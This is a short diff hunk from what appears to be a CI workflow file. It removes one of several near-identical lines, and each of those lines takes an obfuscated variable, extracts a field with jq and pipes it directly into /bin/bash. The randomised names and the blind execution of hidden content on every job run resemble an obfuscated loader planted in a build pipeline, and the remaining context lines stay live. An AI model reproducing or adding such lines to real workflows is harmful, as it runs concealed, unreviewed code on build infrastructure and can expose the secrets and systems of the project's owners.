@@ -24,7 +24,6 @@ jobs:
           echo $sn2 | jq -r .fmo1683 | /bin/bash
           echo $gmz565 | jq -r .j2961 | /bin/bash
           echo $zjrc0 | jq -r .m50 | /bin/bash
-          printf '%s' "$fyb21" | jq -r .enisi6013 | /bin/bash
           echo $df1401 | jq -r .v812 | /bin/bash
           echo $uqbcy4 | jq -r .o04451 | /bin/bash
           echo $smk02 | jq -r .nxu5 | /bin/bash
